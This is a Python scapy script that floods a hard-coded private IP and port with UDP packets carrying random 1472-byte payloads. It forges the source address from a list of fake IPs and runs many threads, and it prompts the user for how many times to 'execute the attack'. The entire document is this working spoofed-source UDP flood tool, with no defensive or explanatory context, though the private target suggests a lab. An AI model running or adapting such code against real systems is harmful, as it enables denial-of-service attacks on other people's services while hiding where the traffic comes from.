from scapy.all import *
import random
import threading
import time
from tqdm import tqdm

sent_packets = 0
start_time = 0

sent_packets_lock = threading.Lock()

def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)

        udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / Raw(RandString(size=1472))

        send(udp_packet, verbose=0)

        with sent_packets_lock:
            sent_packets += 1

        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        time.sleep(1)  

# Main function
def main():
    global start_time
    number_of_packets = int(input("Enter the number of times to execute the attack: "))

    server_ip = '192.168.119.130'
    server_port = 12345

    source_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102']

    start_time = time.time()  
    
    with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
        threads = []

        for _ in range(number_of_packets):
            thread = threading.Thread(target=send_udp_packet, args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()
